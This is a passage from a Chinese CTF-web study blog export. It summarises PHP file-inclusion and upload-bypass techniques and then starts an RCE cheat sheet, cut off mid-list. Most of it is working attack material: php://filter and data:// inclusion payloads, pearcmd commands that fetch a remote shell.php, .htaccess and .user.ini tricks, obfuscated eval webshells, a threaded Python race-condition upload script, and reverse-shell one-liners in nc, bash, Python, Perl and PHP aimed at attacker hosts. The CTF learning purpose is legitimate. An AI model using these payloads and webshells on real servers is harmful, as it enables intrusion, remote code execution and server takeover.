?file=php://filter/write=string.rot13/resource=1.php</code></li><li><code>?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30</code></li></ul></li></ul></li><li><p>需要 Rot13 编码：</p><ul><li><code>POST: content=&lt;?php system(&#39;cat f*&#39;);</code></li><li><code>content=&lt;?cuc cucvasb();?&gt;</code></li></ul></li><li><p>或：</p><ul><li><code>?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php</code></li><li><code>/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%37%30%25%35%66%25%37%34%25%36%31%25%36%37%25%37%33%25%37%63%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30</code></li><li><code>post传入 &lt;?php phpinfo();</code></li><li><code>PD9waHAgcGhwaW5mbygpOw==</code></li></ul></li><li><p>或：</p><ul><li><code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</code></li><li><code>post: contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</code></li></ul><p>利用filter链构造的方式构造任意字符</p><p>​<a href="https://probiusofficial.github.io/PHP-FilterChain-Exploit/">PHP FilterChain 生成器 (probiusofficial.github.io)</a></p></li></ul><h1 id="文件包含配合伪协议"><a href="#文件包含配合伪协议" class="headerlink" title="文件包含配合伪协议"></a>文件包含配合伪协议</h1><ul><li><code>include($file)</code></li><li>示例：<ul><li><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></li><li><code>?file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%35%25%36%45%25%36%33%25%36%46%25%36%34%25%36%35/resource=flag.php   //二次编码解很多题</code></li><li><code>?data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code></li><li><code>?file=data://text/plain;base64,PD89c3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==   //&lt;?=system(&#39;tac flag.php&#39;);?&gt;</code></li><li><code>?file=php://filter/convert.iconv.ASCII.UCS-2BE/resource=flag.php</code></li><li><code>?file=compress.zlib:///var/www/html/flag.php</code></li><li><code>compress.zlib://data:@baidu.com/baidu.com,phpinfo() 构造思路：</code>@<code>使</code>data:<code>被解释为用户名和密码 baidu.com/baidu.com 只要它包含了 /，通常被认为是合法的 media-type。作为有效的压缩流，而是将整个 URL 作为字面文本读取了。file_get_contents结果是phpinfo()</code></li><li><code>?file=phar://test.zip/shell.txt   //相对路径 phar把shell.txt压缩成test.zip文件</code></li></ul></li></ul><h1 id="包含-htaccess-文件"><a href="#包含-htaccess-文件" class="headerlink" title="包含 .htaccess 文件"></a>包含 .htaccess 文件</h1><ul><li>示例：<ul><li><code>php_value auto_append_file /tmp/webshell.txt</code></li><li><code>php_value auto_append_file /temp/sess_xxxxxx</code></li><li><code>先执行其他php完再包含/tmp/webshell</code></li><li><code>自己包含自己会将注释句子一起执行</code></li><li><code>php_value auto_append_file .htaccess</code></li><li><code>#&lt;?php echo(123);eval($_POST[0]);?&gt;</code></li></ul></li></ul><h1 id="见到-shtml-考虑-ssi"><a href="#见到-shtml-考虑-ssi" class="headerlink" title="见到 shtml 考虑 ssi"></a>见到 shtml 考虑 ssi</h1><ul><li>示例：<ul><li><code>.htaccess</code></li><li><code>AddType text/html .shtml</code></li><li><code>AddHandler server_parsed .shtml</code></li><li><code>Options Includes</code></li><li><code>1.shtml</code></li><li><code>&lt;pre&gt;</code></li><li><code>&lt;!--#exec cmd=&quot;whomai&quot;--&gt;</code></li><li><code>&lt;/pre&gt;</code></li></ul></li></ul><h1 id="传统条件竞争不可取"><a href="#传统条件竞争不可取" class="headerlink" title="传统条件竞争不可取"></a>传统条件竞争不可取</h1><ul><li>示例：<ul><li><code>条件竞争php7.0</code></li><li><code>file=php://filter/strip_tags/resource=/ect/passwd  会报错不执行</code></li><li><code>post传文件就直接永久保存下来，在phpinfo界面找file包含即可</code></li><li><code>自包含(题中的包含或者.htaccess包含 php_value auto_append_file 1.txt)，上传，phpinfo页面，这几个保证在一个界面，在自包含下给phpinfo界面传文件，</code></li><li><code>自包含shell</code></li><li><code>1.txt</code></li><li><code>&lt;?</code></li><li><code>echo (&#39;1.txt is ready&#39;);</code></li><li><code>file_put_contents(&#39;/tmp/shell.php&#39;,&#39;&lt;?php echo(&#39;haha,is OK&#39;);eval($_POST[0]);?&gt;&#39;);</code></li></ul></li></ul><h1 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h1><ul><li>示例：<ul><li><code>/var/log/nginx/access.log，利用ua头即可包含</code></li></ul></li></ul><h1 id="包含-environ-文件"><a href="#包含-environ-文件" class="headerlink" title="包含 environ 文件"></a>包含 environ 文件</h1><ul><li>条件：<ul><li><code>php以cgi方式运行，这样environ才会保持UA头。</code></li><li><code>environ文件存储位置已知，且environ文件可读。</code></li><li><code>每个用户都有属于自己的environ环境</code></li></ul></li></ul><h1 id="session-文件包含"><a href="#session-文件包含" class="headerlink" title="session 文件包含"></a>session 文件包含</h1><ul><li>示例：<ul><li><code>能赋值就直接赋值包含</code></li><li><code>不行就进度条</code></li><li><code>/tem/sess_PHPSESSID</code></li><li><code>/var/lib/php/session/sess_PHPSESSID</code></li><li><code>这里的PHPSESSID是cookie当用户控制时（session.use_struct_mode开）随便写入，利用session进度条，利用写的HTML，随便传抓包，确保有Cookie: PHPSESSID=xxxxxxx并找到其位置  /sess_xxxxxx</code></li><li><code>默认是一直删除，所以一直重发session页面的包，并且一直重发包含session文件的页面包含进去</code></li></ul></li></ul><h1 id="pear-文件包含"><a href="#pear-文件包含" class="headerlink" title="pear 文件包含"></a>pear 文件包含</h1><ul><li>条件：<ul><li><code>1 有文件包含点</code></li><li><code>2 开启了pear扩展</code></li><li><code>3 配置文件中register_argc_argv 设置为On,而默认为Off</code></li></ul></li><li>说明：<ul><li><code>PEAR扩展</code></li><li><code>PHP Extension and Application Repository</code></li><li><code>默认安装位置是  /usr/local/lib/php/</code></li><li><code>包含测试?file=/usr/local/lib/php/pearcmd.php&amp;version</code></li></ul></li><li>利用 Pear 扩展进行文件包含<ul><li>page参数存在文件包含，题目提示很明显，register_argc_argv，所以打pearcmd包含</li><li>方法一 远程文件下载<ul><li>示例：<ul><li><code>?file=/usr/local/lib/php/pearcmd.php&amp;ctfshow+install+-R+/var/www/html/+http://47.236.120.83/shell.php  //shell密码是cmd</code></li></ul></li></ul></li><li>方法二 生成配置文件，配置项传入我们恶意的php代码的形式<ul><li>上传 <code>ctfshow.php</code><ul><li>示例：<ul><li><code>a=b</code></li><li><code>username=root</code></li><li><code>man_dir=&lt;?php eval($_POST[1]);?&gt;</code></li></ul></li><li>示例：<ul><li><code>GET /?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/ctf.php+-d+man_dir=&lt;?eval($_POST[1]);?&gt;+-s+</code></li></ul></li><li>然后直接利用密码是1</li><li>?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+config-create+&#x2F;tmp&#x2F;<?=system('/readflag')?>&#x2F;*+&#x2F;tmp&#x2F;pwn.php</li><li>之后访问?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;pwn.php</li></ul></li></ul></li><li>方法三 写配置文件方式<ul><li>示例：<ul><li><code>GET /?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=</code>$_POST[1]<code>;?&gt;+1.php</code></li><li>访问 <code>http://&lt;靶场服务器IP&gt;/1.php</code></li></ul></li></ul></li></ul></li></ul><h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><ul><li>说明：<ul><li>通过域转数字的形式，可以不用.来构造远程文件地址</li><li>示例：<ul><li><code>http://www.msxindl.com/tools/ip/ip_num.asp</code></li><li><code>?file=http://731540450/1</code></li></ul></li></ul></li></ul><h1 id="open-basedir-突破"><a href="#open-basedir-突破" class="headerlink" title="open_basedir 突破"></a>open_basedir 突破</h1><ul><li>说明：<ul><li>利用闭合直接 <code>glob</code> 获取根目录的文件名</li><li>示例：<ul><li><code>?&gt;&lt;?php</code></li><li><code>var_dump(scandir(&#39;glob:///*&#39;));?&gt;</code></li></ul></li></ul></li><li>或者利用 <code>glob+DirectoryIterator</code> 获取根目录的文件名，新建 <code>glob.php</code> 文件，内容如下<ul><li>示例：<ul><li><code>&lt;?php</code></li><li><code>$it = new DirectoryIterator(&quot;glob:///*&quot;);</code></li><li><code>foreach($it as $f) &#123;</code></li><li><code>echo $f-&gt;__toString().&quot;&lt;br/&gt;&quot;;</code></li><li><code>&#125;</code></li><li><code>直接通过蚁剑链接，将glob.php上传再访问找到flag名</code></li></ul></li></ul></li><li>利用 <code>ini_set、mkdir、chdir</code> 来获取文件内容，新建 <code>flag.php</code> 文件，内容如下<ul><li>示例：<ul><li><code>&lt;?php</code></li><li><code>mkdir(&#39;tmpdir&#39;); chdir(&#39;tmpdir&#39;);</code></li><li><code>ini_set(&#39;open_basedir&#39;,&#39;..&#39;);</code></li><li><code>chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;);</code></li><li><code>ini_set(&#39;open_basedir&#39;,&#39;/&#39;);</code></li><li><code>$a=file_get_contents(&#39;/f11aggg&#39;);</code></li><li><code>var_dump($a);</code></li><li><code>?&gt;</code></li><li>访问即可得到flag</li></ul></li></ul></li></ul><h1 id="nginx-大文件上传缓存文件利用"><a href="#nginx-大文件上传缓存文件利用" class="headerlink" title="nginx 大文件上传缓存文件利用"></a>nginx 大文件上传缓存文件利用</h1><h1 id="pcache-扩展生成缓存文件利用"><a href="#pcache-扩展生成缓存文件利用" class="headerlink" title="pcache 扩展生成缓存文件利用"></a>pcache 扩展生成缓存文件利用</h1><ul><li>有任意文件读取，前面双写绕过&#x2F;.的过滤</li><li>示例：<ul><li><code>/?tpl=...//...//...//...//...//...//...//...//etc/passwd</code></li></ul></li><li>flag 在 <code>flag.php</code> 里，源码对最后一个.后的后缀名进行判断，无法直接绕过读取flag.php，查看phpinfo</li><li>示例：<ul><li><code>/?tpl=debug</code></li><li><code>发现开启了opcache，它会缓存php文件进入指定缓存文件夹，路径为缓存文件夹/[system_id]/var/www/html/flag.php.bin</code></li><li>只要访问这个bin文件即可绕过后缀过滤，查看phpinfo发现缓存文件夹为 <code>/var/www/a/</code></li><li>主要是计算 <code>system_id</code>，有现成工具 <code>php7-opcache-override(https://github.com/GoSecure/php7-opcache-override)</code></li><li><code>用法：</code><ul><li><code>python3 system_id_scraper.py info.html 或者 python3 system_id_scraper.py url</code></li><li><code># info.html为phpinfo的前端信息界面另存为所得</code></li><li><code># url为phpinfo地址</code></li><li>示例：<ul><li><code>算出system_id为1116d566fdc53f79abce6c01e3a0308d</code></li><li><code>所以先访问flag.php使其产生缓存文件（这一步必须要），之后执行访问如下进行包含即可</code></li><li><code>/?tpl=...//...//...//...//...//...//...//...//var/www/a/1116d566fdc53f79abce6c01e3a0308d/var/www/html/flag.php.bin</code></li><li><code>#flag&#123;Opcache_Succ_ess!!&#125;</code></li></ul></li></ul></li></ul></li></ul><hr><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id=""><a href="#" class="headerlink" title="&lt;?php 的绕过"></a><code>&lt;?php</code> 的绕过</h2><ul><li>示例：<ul><li><code>&lt;?=</code> </li><li><code>&lt;script language=&#39;php&#39;&gt;phpinfo();&lt;/script&gt;</code></li><li><code>&lt;% phpinfo();%&gt; //asp tag少</code></li></ul></li><li>思路是找过滤，是内容还是后缀，是白还是黑</li></ul><h2 id="前端-js-检查"><a href="#前端-js-检查" class="headerlink" title="前端 js 检查"></a>前端 js 检查</h2><ul><li>示例：<ul><li>后改为 bp</li><li>图片头 <code>GIF89A</code> 为第一行</li><li>加入带马的图片</li></ul></li></ul><h3 id="shell-总结"><a href="#shell-总结" class="headerlink" title="shell 总结"></a>shell 总结</h3><ul><li>示例：<ul><li><code>&lt;?echo (&#39;123&#39;);eval($_POST[0]);?&gt;</code></li><li><code>&lt;?=eval($_POST&#123;1&#125;);?&gt; //过滤[]</code></li><li><code>&lt;?=system(&#39;tac ../f*&#39;)?&gt; //过滤&#123;&#125;[]</code></li><li><code>&lt;script language=”php”&gt;echo &#39;123&#39;; &lt;/script&gt;</code></li><li><code>&lt;?= eval(array_pop($_REQUEST))?&gt;</code></li><li><code>&lt;?= @eval(array_pop($_POST))?&gt; //传1=system(&#39;ls /&#39;)</code></li><li>上传完shell无论是jpg还是php直接包含</li><li>示例：<ul><li><code>?file=upload/1.jpg&amp;0=tac%20Flag_is_here_acffd72.php</code></li></ul></li></ul></li></ul><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><ul><li>示例：<ul><li><code>利用fuzz方法快速测试可上传后缀：upload-fuzz-dic-builder()</code></li><li>项目地址：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a></li><li>用法：<code>python2 upload-fuzz-dic-builder.py -n shell -a jpg  -l php -m apache --os linux  -o upload_file.txt</code></li><li>双写：<ul><li>php后缀名大小写、点绕过、空格绕过、::$DATA绕过、冒号绕过（Windows特性）</li><li>php支持的可解析别名：php2, php3, php4, php5, phps, pht, phtm, phtml</li></ul></li></ul></li><li><code>.user.ini</code> 上传，先发图片再改为这个 <code>.user.ini</code> 名字<ul><li>但是这种方式其实是有个前提的，因为 <code>.user.ini</code> 只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以。</li><li>示例：<ul><li><code>1.写入内容auto_prepend_file=1.txt 再上传1.txt的马不行就写&lt;?=eval($_COOKIE[1]); 传COOKIE：1=eval(base64_decode(&#39;cGhwaW5mbygpOw==&#39;))?&gt;</code></li><li><code>2.写入内容auto_prepend_file=php://input</code></li><li><code>上传完直接随便发个东西在bp直接传码就行</code></li><li><code>3.写入内容auto_prepend_file=/var/log/nginx/access.log</code></li><li><code>上传后ua写码&lt;?php eval($_POST[1]);?&gt;木马，插入日志后就不写ua头直接rce就行，POST不行就COOKIE&lt;?php eval($_COOKIE[1]);?&gt; 1=eval(base64_decode(&#39;&#39;))?&gt;COOKIE不解析空格</code></li><li><code>4..user.ini写入内容</code></li><li><code>GIF89a</code></li><li><code>auto_prepend_file=/tmp/sess_shell</code></li><li><code>用session进度条post发包并拦截，马是&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;</code></li><li><code>改Cookie:PHPSESSID=shell,在PHP_SESSION_UPLOAD_PROGRESS的主体的最后一行写&lt;?php fwrite(fopen(&#39;1.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#39;);?&gt;</code></li><li><code>将该POST数据包与访问upload目录的GET数据包进行条件竞争，访问upload的数据包长度发生变化即创建后门文件成功</code></li></ul></li></ul></li><li><code>.htaccess</code> 文件<ul><li>方式1：<ul><li><code>AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php</code></li><li>还支持 <code>AddType application/x-httpd-ph\p .png</code></li></ul></li><li>方式2：<ul><li><code>&lt;FilesMatch &quot;png&quot;&gt;</code></li><li><code>SetHandler application/x-httpd-php</code></li><li><code>&lt;/FilesMatch&gt;</code></li><li>如果flag不是php文件，那么还可以像 <code>.user.ini</code> 一样在当前目录加载一个文件</li><li>示例：<ul><li><code>php_value auto_append_file &#39;flag&#39;</code></li></ul></li></ul></li><li>基于 <code>.htaccess</code> 的盲注</li></ul></li></ul><h2 id="基础免杀"><a href="#基础免杀" class="headerlink" title="基础免杀"></a>基础免杀</h2><ul><li>示例：<ul><li><code>&lt;?php</code></li><li><code>$a = &quot;s#y#s#t#e#m&quot;;</code></li><li><code>$b = explode(&quot;#&quot;,$a);</code></li><li><code>$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</code></li><li><code>$c($_REQUEST[1]);</code></li><li><code>?&gt;</code></li></ul></li><li>示例：<ul><li><code>&lt;?php</code></li><li><code>$a=substr(&#39;1s&#39;,1).&#39;ystem&#39;;</code></li><li><code>$a($_REQUEST[1]);</code></li><li><code>?&gt;</code></li></ul></li><li>示例：<ul><li><code>&lt;?php</code></li><li><code>$a=strrev(&#39;metsys&#39;);</code></li><li><code>$a($_REQUEST[1]);</code></li><li><code>?&gt;</code></li></ul></li><li>示例：<ul><li><code>&lt;?php</code></li><li><code>$a=$_REQUEST[&#39;a&#39;];</code></li><li><code>$b=$_REQUEST[&#39;b&#39;];</code></li><li><code>$a($b);</code></li><li><code>?&gt;</code></li></ul></li><li>图像检测函数<ul><li><code>mime_content_type</code></li><li><code>getimagesize和exif_imagetype函数</code><ul><li>以上3个函数都是通过检查文件的幻数判断文件的类别。可以直接下列命令制作后门jpg文件进行绕过。</li><li>示例：<ul><li><code>打开 cmd，导航到包含 safe.jpg 和 shell.php 文件的目录，然后运行命令</code></li><li><code>copy safe.jpg /b + shell.php /a shell.jpg</code></li></ul></li></ul></li></ul></li></ul><h2 id="文件移动函数"><a href="#文件移动函数" class="headerlink" title="文件移动函数"></a>文件移动函数</h2><ul><li>示例：<ul><li><code>move_uploaded_file函数会忽略掉文件末尾的/.</code></li></ul></li></ul><h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><ul><li>示例：<ul><li><code>IIS5.X/6.0</code><ul><li><code>目录解析：如果目录采取/1.asp/的命令方式，那么访问该目录下的文件会默认以asp的方式执行</code></li><li><code>文件解析：iis读取到;会默认结束，可以用1.asp;.jpg的形式进行绕过</code></li><li><code>特殊后缀：1.asa、1.cer、1.cdx</code></li></ul></li><li><code>IIS7/7.5</code><ul><li>如果配置中开启 <code>cgi.fix_pathinf</code></li><li>同 <code>nginx</code> 解析漏洞</li></ul></li><li><code>Apache解析漏洞</code><ul><li><code>解析漏洞:从右到左判断后缀并解析（低版本）</code></li><li><code>123.php.asaa：Apache会先判断asaa不认识，那就会判断.php它认识就默认以这种方式进行解析。</code></li></ul></li><li><code>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</code><ul><li>示例：<ul><li><code>shell.php%0a</code></li></ul></li></ul></li><li><code>Nginx解析漏洞</code><ul><li>示例：<ul><li><code>hack.jpg/1.php</code></li><li><code>nginx看到文件扩展名是.php，便不管该文件是否存在，直接交给php处理，然后php的默认配置下看到右边的文件不存在，便删去最后的文件名，读取前一个，所以将.jpg处理成为php</code></li></ul></li></ul></li><li><code>nginx 文件名逻辑漏洞（CVE-2013-4547）</code><ul><li>示例：<ul><li><code>shell.gif[0x20][0x00].php</code></li></ul></li></ul></li><li><code>Windows环境</code><ul><li>示例：<ul><li><code>shell.php.jpg</code></li><li><code>此时目录中会生成shell.php文件，但内容为空。再利用PHP和Windows环境的叠加属性：</code></li><li><code>再上传shell.&gt;&gt;&gt;来匹配并覆盖shell.php</code></li><li><code>shell.php::$DATA</code></li><li><code>shell.php </code>（php后有个空格）</li><li><code>shell.php.</code></li></ul></li></ul></li><li><code>shell.phtml</code></li><li><code>shell.php%00</code></li><li><code>shell.gif[0x20][0x00].php</code></li><li><code>shell.php.jpg</code></li><li><code>shell.pphphp</code></li><li><code>shell.PHP</code></li><li><code>shell.php.jpg</code></li></ul></li></ul><h2 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h2><ul><li>示例：<ul><li><code>先移动，后检测，不符合再删除，符合则改名字</code></li><li><code>使用多线程并发进行上传与访问操作</code></li><li><code>查看源代码发现只能上传zip那我们直接上传一句话就可以了注意修改Content-Type为application/x-zip-compressed</code></li><li><code>然后直接文件包含就可以了</code></li></ul></li></ul><h2 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h2><ul><li><h2 id="示例：-查看页面源代码，明显的条件竞争，新建一个文件shell-php，内容如下-执行如下脚本进行竞争上传"><a href="#示例：-查看页面源代码，明显的条件竞争，新建一个文件shell-php，内容如下-执行如下脚本进行竞争上传" class="headerlink" title="示例：- 查看页面源代码，明显的条件竞争，新建一个文件shell.php，内容如下  - &lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#39;); ?&gt;- 执行如下脚本进行竞争上传"></a>示例：<br>- <code>查看页面源代码，明显的条件竞争，新建一个文件shell.php，内容如下</code><br>  - <code>&lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#39;); ?&gt;</code><br>- 执行如下脚本进行竞争上传</h2><ul><li><pre><code class="py"># -*- coding:utf-8 -*-import requestsimport threadingimport osclass RaceCondition(threading.Thread):    def __init__(self):        threading.Thread.__init__(self)        self.url = &#39;http://192.168.13.140:8011/uploads/shell.php&#39; #上传的文件地址        self.uploadUrl = &#39;http://192.168.13.140:8011/index.php&#39; #上传文件的地址    def _get(self):        print(&#39;try to call uploaded file...&#39;)        r = requests.get(self.url)        if r.status_code == 200:            print(&#39;[*] create file info.php success.&#39;)            os._exit(0)    def _upload(self):        print(&#39;upload file...&#39;)        file = &#123;&#39;myfile&#39;: open(&#39;shell.php&#39;, &#39;r&#39;)&#125; #本地脚本木马        requests.post(self.uploadUrl, files=file)    def run(self):        while True:            for i in range(5):                self._get()            for i in range(10):                self._upload()                self._get()if __name__ == &#39;__main__&#39;:    threads = 50        for i in range(threads):        t = RaceCondition()        t.start()    for i in range(threads):        t.join() </code></pre></li><li><p><code>成功后访问./uploads/info.php</code></p></li></ul></li></ul><hr><h1 id="phpinfo-页面"><a href="#phpinfo-页面" class="headerlink" title="phpinfo 页面"></a>phpinfo 页面</h1><ul><li>PHP 版本信息<ul><li>重要性: 通过了解PHP的具体版本，你可以查找该版本已知的漏洞。不同PHP版本可能存在不同的安全问题，例如远程代码执行、文件包含漏洞等。</li><li>如何利用: 查找并利用该PHP版本的CVE（Common Vulnerabilities and Exposures）漏洞。例如，较旧版本的PHP可能存在未修复的远程代码执行漏洞。</li><li>位置: <code>phpinfo()</code> 输出的顶部通常显示 <code>PHP Version</code> 字段。</li></ul></li><li>加载的PHP模块<ul><li>重要性: 加载的模块揭示了服务器支持的功能。例如，curl模块允许网络请求，gd模块提供图像处理功能。某些模块可能引入额外的攻击向量。</li><li>如何利用: 通过加载的模块，可以识别出特定模块的漏洞并利用它们。例如，openssl模块的配置可能存在安全隐患。</li><li>位置: <code>phpinfo()</code> 页面</li></ul></li></ul><hr><h1 id="文件上传的探测"><a href="#文件上传的探测" class="headerlink" title="文件上传的探测"></a>文件上传的探测</h1><ul><li>功能: 使用一些在线或自建的测试脚本，探测是否允许文件上传。</li><li>使用方法:<ul><li>尝试上传不同类型的文件（如.php, .jpg）并观察服务器响应。</li><li>使用Web应用测试工具（如OWASP ZAP）中的文件上传探测功能。</li></ul></li><li>结果: 通过响应状态码或文件路径的返回，判断文件上传的成功与否及其可能的利用方式。</li></ul><hr><h1 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h1><ul><li>功能: Nikto是一款开源的Web服务器扫描器，用于检测Web服务器的漏洞和配置问题。</li><li>使用方法:<ul><li><code>nikto -h http://example.com</code></li></ul></li><li>结果: 能够发现服务器暴露的敏感文件、配置文件和其他潜在漏洞，并显示PHP版本等信息。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>文件操作</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rce总结</title>
    <link href="/2024/09/01/rce%E6%80%BB%E7%BB%93/"/>
    <url>/2024/09/01/rce%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><ul><li>assert() </li><li>preg_replace(a,b,c) :c中被a的要求匹配时。匹配部分以b(此时执行)替换</li><li>create_function </li><li>动态调用：变量当做函数用</li><li>回调函数 call_user_func(a,b) 例子：a:assert（不能是eval或是echo这种语言结构），b:$GET_[‘cmd’]<ul><li>call_user_func_array(a,b) b是数组数组中的元素会按照顺序依次作为参数传递给指定的函数或方法<ul><li>例如：function add($x, $y) $params &#x3D; [2, 3];$result &#x3D; call_user_func_array(‘add’, $params);</li></ul></li><li>array_filter(a,b) a数组b函数</li><li>array_map(a,b)  a函数b数组</li><li>${php代码}</li></ul></li></ul><h2 id="paylpd：eval-传入字符串解释其为php代码执行"><a href="#paylpd：eval-传入字符串解释其为php代码执行" class="headerlink" title="paylpd：eval()传入字符串解释其为php代码执行"></a>paylpd：eval()传入字符串解释其为php代码执行</h2><ul><li>转接头写法：eval($GET_[1])    访问…&#x2F;?1&#x3D;eval($POET_[1]);链接蚁剑<ul><li>…&#x2F;?1&#x3D;$a&#x3D;’sys’;$b&#x3D;’tem’;$c&#x3D;$a.$b;$c($POST_[1])post：1&#x3D;ls &#x2F;</li><li><?`$_GET[1]`;&1=nc 43.323.323.2323 4444 -e /bin/bash    攻击方：nc -lvnp 4444- bash -i >& /dev/tcp/<攻击者IP>/4444 0>&1- python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<攻击者IP>",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'- perl -e 'use Socket;$i="<攻击者IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'- php -r '$sock=fsockopen("<攻击者IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</li><li>经典读文件函数<ul><li>file_get_contents()</li><li>highlight_file()</li><li>fopen()</li><li>readfile()</li><li>fread()</li><li>fgetss()</li><li>fgets()</li><li>parse_ini_file()</li><li>show_source()</li><li>file()</li><li>var_dump(scandir(‘&#x2F;‘));</li><li>&#x2F;var&#x2F;www&#x2F;html&#x2F;</li></ul></li></ul></li></ul><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ul><li>位点：system(“”)里面写命令liunx，保证让系统看出是字符串<ul><li>passthru</li><li>exec</li><li>shell_exec没有回显的执行函数或者设置&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1等无回显</li><li>popen</li><li>pcntl_exec</li></ul></li><li>liunx系统操作：<ul><li>find &#x2F; -name flag*  &#x2F;&#x2F;没有flag。没关系我们用<a href="https://www.runoob.com/linux/linux-comm-find.html">find</a>命令从根目录开始找。</li><li>pwd: 显示当前工作目录的路径。</li><li>ls: 列出当前目录中的文件和目录。<ul><li>ls -l  # 显示详细信息</li><li>ls -a  # 显示隐藏文件</li><li>ls -la合体</li></ul></li><li>cd: 切换目录。<ul><li>cd ..  # 返回上一级目录</li><li>cd ~  # 返回用户主目录</li></ul></li><li>cp: 复制文件或目录。<ul><li>cp source_file destination_file  # 复制文件</li><li>cp -r source_directory destination_directory  # 复制目录</li></ul></li><li>mv: 移动或重命名文件和目录。<ul><li>mv old_name new_name  # 重命名文件或目录</li><li>mv file_name &#x2F;path&#x2F;to&#x2F;directory  # 移动文件</li></ul></li><li>rm: 删除文件或目录<ul><li>rm file_name  # 删除文件</li><li>rm -r directory_name  # 删除目录</li></ul><p></p></li><li>mkdir: 创建新目录。<ul><li>mkdir new_directory</li></ul></li><li>rmdir: 删除空目录。<ul><li>rmdir directory_name</li></ul></li><li>cat: 显示文件内容。<ul><li>cat file_name</li></ul><p></p></li><li>more: 分页显示文件内容<ul><li>more file_name</li></ul></li><li>less: 分页显示文件内容，支持向前滚动。<ul><li>less file_name</li></ul></li><li>head: 显示文件的前几行。<ul><li>head file_name</li><li>head -n 10 file_name  # 显示文件的前10行</li></ul></li><li>显示文件的后几行</li><li>tail: 显示文件的后几行。<ul><li>tail file_name</li><li>tail -n 10 file_name  # 显示文件的后10行</li></ul></li><li>nano: 简单的文本编辑器。<ul><li>nano file_name</li></ul></li><li>功能强大的文本编辑器</li><li>vi 或 vim: 功能强大的文本编辑器。<ul><li>vi file_name</li><li>vim file_name</li></ul></li><li>top: 动态显示系统的运行信息，包括进程、CPU、内存使用情况。<ul><li>ps aux  # 显示所有进程的详细信息</li></ul></li><li>kill: 